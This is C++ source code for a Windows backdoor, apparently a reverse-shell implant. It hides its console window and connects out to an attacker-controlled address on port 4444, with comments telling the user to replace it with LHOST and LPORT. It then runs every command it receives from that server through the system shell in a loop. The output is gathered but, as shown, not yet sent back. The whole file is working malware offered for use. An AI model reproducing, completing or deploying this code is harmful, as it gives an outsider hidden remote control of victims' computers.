#include <iostream>
#include <string>
#include <winsock2.h>
#include <windows.h>
#include <fstream> // For file operations (if needed elsewhere)

#pragma comment(lib, "ws2_32.lib")

using namespace std;

// Function to execute commands received from the server
void executeCommand(const string& command) {
    char buffer[128];
    string result = "";
    FILE* pipe = _popen(command.c_str(), "r");

    if (!pipe) {
        return;
    }

    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        result += buffer;
    }

    _pclose(pipe);
    // Do something with the result, e.g., send back to the server
}

// Entry point for a Windows Application (non-console)
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide the window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    WSADATA wsaData;
    SOCKET connSocket;
    sockaddr_in serverAddr;
    string serverIP = "10.0.1.35";  // Replace with LHOST (server IP)
    int serverPort = 4444;  // Replace with LPORT (server port)

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    // Create socket
    connSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (connSocket == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(serverIP.c_str());
    serverAddr.sin_port = htons(serverPort);

    // Connect to server
    if (connect(connSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(connSocket);
        WSACleanup();
        return 1;
    }

    char buffer[1024];
    while (true) {
        memset(buffer, 0, sizeof(buffer));
        int bytesReceived = recv(connSocket, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived <= 0) {
            break;  // Exit loop if connection is closed or error occurs
        }

        string command(buffer);
        command = command.substr(0, command.find("\n"));  // Trim trailing newline

        if (command == "exit") {
            break;
        }

        // Execute the command received from the server
        executeCommand(command);
    }

    closesocket(connSocket);
    WSACleanup();
    return 0;
}
